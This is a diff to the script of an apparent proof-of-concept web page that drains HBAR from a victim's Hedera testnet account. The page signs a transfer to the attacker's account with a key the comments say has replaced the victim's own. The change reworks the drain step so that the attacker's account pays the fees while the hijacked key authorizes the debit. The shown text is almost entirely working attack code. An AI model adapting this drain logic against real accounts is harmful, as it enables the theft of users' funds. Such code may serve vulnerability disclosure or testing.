@@ -215,19 +215,24 @@ button:disabled { opacity: .45; }
 
             log("Draining account with the attacker's key...", "err");
 
-            // attackerKey is now the controlling key — set up attacker client
-            const attackerClient = SDK.Client.forTestnet().setOperator(targetId, attackerKey);
+            // Fee payer = attacker's infrastructure account (has funds, no precheck risk on victim).
+            // Victim (targetId) just signs to authorize the debit — attackerKey is now its key.
+            const drainClient = SDK.Client.forTestnet().setOperator(operatorAccountId, operatorPrivateKey);
 
             log("Sending " + (SEND_AMOUNT / 100000000) + " HBAR to attacker...", "info");
 
-            const drainTx = await new SDK.TransferTransaction()
+            const unsignedDrain = await new SDK.TransferTransaction()
                 .addHbarTransfer(targetId, -SEND_AMOUNT)
                 .addHbarTransfer(operatorAccountId, SEND_AMOUNT)
-                .execute(attackerClient);
+                .freezeWith(drainClient);
+
+            const drainTx = await unsignedDrain.sign(attackerKey); // victim's new key authorizes debit
+
+            const drainResult = await drainTx.execute(drainClient);
 
             {
 
-                const drainReceipt = await drainTx.getReceipt(attackerClient);
+                const drainReceipt = await drainResult.getReceipt(drainClient);
                 log("Drain status: " + drainReceipt.status.toString(), "ok");
 
                 const after = await mirrorAccount(targetAccount);
